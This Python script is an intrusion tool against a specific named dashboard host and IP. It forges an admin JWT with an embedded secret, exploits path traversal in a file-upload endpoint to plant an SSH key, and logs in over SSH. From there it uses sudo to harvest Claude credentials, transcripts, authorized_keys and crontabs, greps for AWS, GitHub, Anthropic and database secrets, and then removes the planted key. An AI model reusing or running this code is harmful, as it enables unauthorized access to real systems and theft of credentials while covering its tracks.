#!/usr/bin/env python3
# i29308: host-level read-only harvest of intelora12 (54.179.173.218) as coder (NOPASSWD sudo+docker).
# Step1: re-inject ed25519 pubkey via dashboard files/upload path injection (local branch /.lumii-agent-keeper/)
# Step2: ssh coder@54.179.173.218, run read-only harvest (docker inspect / systemd /opt /root /home/coder ...)
# Step3: IMDSv2 recheck (role/user-data/instance-identity)
# Step4: grep secrets
# Step5: restore/neutralize authorized_keys
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="   # dashboard .env.local secret
AGENT = "agent-0cf829f4"; AUID = "4b4f439e-74f7-11f1-ac43-525400595be1"; ACUST = "tianyue"; AIP = "54.179.173.218"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"   # local write branch map: container /home/lumii = host /home/coder
UPATH = "/home/lumii/.ssh/authorized_keys"

def _b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def Rbig(k, s, n=11000):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    if len(s) == 0: s = "(empty)"
    for i in range(0, len(s), n):
        print("R:%s_%02d:%s" % (k, i // n, _b64(s[i:i+n])), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def tok_for(uid, cust): return forge({"userId": uid, "email": "probe@x", "customer": cust, "role": "admin"})

def call(path, cookie=None, timeout=30, maxlen=4000):
    a = ["--http2", "-A", UA, "-H", "Accept: application/json", "-w", "\n__CODE__%{http_code}"]
    if cookie: a += ["-H", "Cookie: session=" + cookie]
    a += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(a, timeout=timeout); i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:maxlen]}

def files_read(path, tok, maxlen=4000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), cookie=tok, maxlen=maxlen)

def upload(tok, path, name, content, timeout=60):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))
    rc, out, err = curl(["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
                         "-F", "files=@%s;filename=%s" % (tmp, name), url], timeout=timeout)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:900]}

HARVEST = r'''

set +e
export LC_ALL=C
R() { echo "=== $1 ==="; }
R "KEEPER CONFIG"
sudo -n sh -c 'ls -laR /home/coder/.lumii/agents 2>/dev/null | head -60'
sudo -n sh -c 'for f in /home/coder/.lumii/agents/*/*/config.toml /home/coder/.lumii/agents/*/config.toml; do [ -f "$f" ] && { echo "## $f"; cat "$f"; echo; }; done' 2>/dev/null
R "AGENT-KEEPER RUNTIME DIR"
sudo -n sh -c 'ls -laR /home/coder/.lumii-agent-keeper 2>/dev/null | head -120'
R "CLAUDE CRED/SETTINGS"
sudo -n sh -c 'for f in /home/coder/.claude/.credentials.json /home/coder/.claude/settings.json /home/coder/.claude/settings.local.json /home/coder/.claude/policy-limits.json /home/coder/.claude/remote-settings.json /home/coder/.claude/history.jsonl; do echo "## $f"; head -40 "$f" 2>/dev/null; echo; done'
R "CLAUDEJSON GREP"
sudo -n sh -c "timeout 40 grep -aoE '0x[0-9a-fA-F]{64}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{12,}|-----BEGIN [A-Z ]*PRIVATE KEY|JWT_SECRET|AGENT_WS_TOKEN|proof_key|inbound_key|sk-ant-[A-Za-z0-9_-]+|ghp_[A-Za-z0-9]+|github_pat_[A-Za-z0-9_]+|gho_[A-Za-z0-9]+|zoofi|claudeAiOauth|refreshToken' /home/coder/.claude.json 2>/dev/null | sort -u | head -40"
R "MCP SERVERS in claude.json"
sudo -n sh -c "timeout 20 python3 -c \"
import json
try:
 d=json.load(open('/home/coder/.claude.json'))
except Exception as e:
 print('err',e); raise SystemExit
def walk(o,p=''):
 if isinstance(o,dict):
  for k,v in o.items():
   if k in ('mcpServers','env') and v:
    print(p+'/'+k, json.dumps(v)[:800])
   walk(v,p+'/'+k)
 elif isinstance(o,list):
  for i,v in enumerate(o[:5]): walk(v,p+'[%d]'%i)
walk(d)
\" 2>/dev/null | head -60"
R "TRANSCRIPT GREP (projects)"
for f in $(sudo -n find /home/coder/.claude/projects -name '*.jsonl' -type f 2>/dev/null); do
  echo "-- $f ($(sudo -n stat -c%s "$f" 2>/dev/null))"
  sudo -n sh -c "timeout 45 grep -aoE '0x[0-9a-fA-F]{64}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{12,}|-----BEGIN [A-Z ]*PRIVATE KEY|JWT_SECRET=[^\\\" ]+|DATABASE_URL=[^\\\" ]+|postgres://[^\\\" ]+|mysql://[^\\\" ]+|redis://[^\\\" ]+|zoofi|AGENT_WS_TOKEN|proof_key|inbound_key|ghp_[A-Za-z0-9]+|github_pat_[A-Za-z0-9_]+|gho_[A-Za-z0-9]+' '$f' 2>/dev/null" | sort -u | head -25
done
R "SESSION-ENV SAMPLE"
sudo -n sh -c 'ls /home/coder/.claude/session-env 2>/dev/null | head -10; for d in $(ls /home/coder/.claude/session-env 2>/dev/null | head -5); do echo "--$d--"; ls -la /home/coder/.claude/session-env/$d 2>/dev/null | head; done'
R "SESSIONS/STATE"
sudo -n sh -c 'ls -la /home/coder/.claude/sessions /home/coder/.claude/state /home/coder/.claude/backups 2>/dev/null | head -60; echo "--sessions grep--"; timeout 30 grep -aoE "0x[0-9a-fA-F]{64}|AKIA[0-9A-Z]{16}|JWT_SECRET|postgres://[^\\\" ]+|-----BEGIN [A-Z ]*PRIVATE KEY|zoofi" /home/coder/.claude/sessions/* /home/coder/.claude/state/* 2>/dev/null | sort -u | head -20'
R "GPG"
sudo -n sh -c 'ls -la /home/coder/.gnupg 2>/dev/null'
R "ROOT+UBUNTU AUTHORIZED KEYS"
sudo -n sh -c 'echo "--root--"; cat /root/.ssh/authorized_keys 2>/dev/null; echo "--ubuntu--"; cat /home/ubuntu/.ssh/authorized_keys 2>/dev/null'
R "ALL DOTENV-ish FILES under /home/coder (depth4)"
sudo -n find /home/coder -maxdepth 4 -type f \( -name '*.env' -o -name '.env*' -o -name '*.pem' -o -name 'id_*' -o -name '*.key' -o -name 'credentials*' -o -name '*.toml' -o -name '*.netrc' \) 2>/dev/null | head -60
R "GITEA/USE CLUES"
sudo -n sh -c 'grep -rIl "gitea\|git.lumii\|GITEA_TOKEN\|gitea-deploy" /home/coder/.claude.json /home/coder/.claude/settings* /home/coder/.lumii 2>/dev/null | head; echo "--guide--"; head -80 /opt/lumii_workspace/*/gitea-deploy-guide.md 2>/dev/null'
R "CRONTAB"
sudo -n sh -c 'crontab -u coder -l 2>/dev/null; echo "--root cron--"; crontab -u root -l 2>/dev/null'
R "SESSION ENV KEYS (names only)"
sudo -n sh -c 'for d in $(ls /home/coder/.claude/session-env 2>/dev/null); do for f in /home/coder/.claude/session-env/$d/*; do [ -f "$f" ] && { echo "## $f"; sed -n "1,40p" "$f"; }; done; done' 2>/dev/null | head -80
R "END2"

'''


def main():
    tok = tok_for(AUID, ACUST)
    R("me", call("/api/me", cookie=tok))
    # ensure key
    sh(["rm", "-f", "/tmp/k29308", "/tmp/k29308.pub"])
    rc, pub, err = sh(["ssh-keygen", "-t", "ed25519", "-N", "", "-C", "i29308", "-f", "/tmp/k29308"], timeout=30)
    pub = open("/tmp/k29308.pub").read().strip() if os.path.exists("/tmp/k29308.pub") else ""
    R("pub", pub)
    # read current authorized_keys
    cur = files_read(UPATH, tok, maxlen=6000)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    R("authkeys_before", {"code": cur["code"], "len": len(orig), "orig": orig[:500]})
    content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + pub + "\n"
    R("upload_key", upload(tok, UF, "authorized_keys", content))
    R("authkeys_after", files_read(UPATH, tok, maxlen=900))
    # ssh harvest
    rc, out, err = sh(["ssh", "-i", "/tmp/k29308", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                       "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "coder@" + AIP, "bash -s"],
                      inp=HARVEST.encode(), timeout=420)
    R("h2_rc", {"rc": rc})
    Rbig("h2_out", out)
    R("h2_err", err[:1500])
    # restore authorized_keys
    if orig.strip():
        R("restore", upload(tok, UF, "authorized_keys", orig))
    else:
        R("restore", upload(tok, UF, "authorized_keys", ""))
    R("authkeys_final", files_read(UPATH, tok, maxlen=600))

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
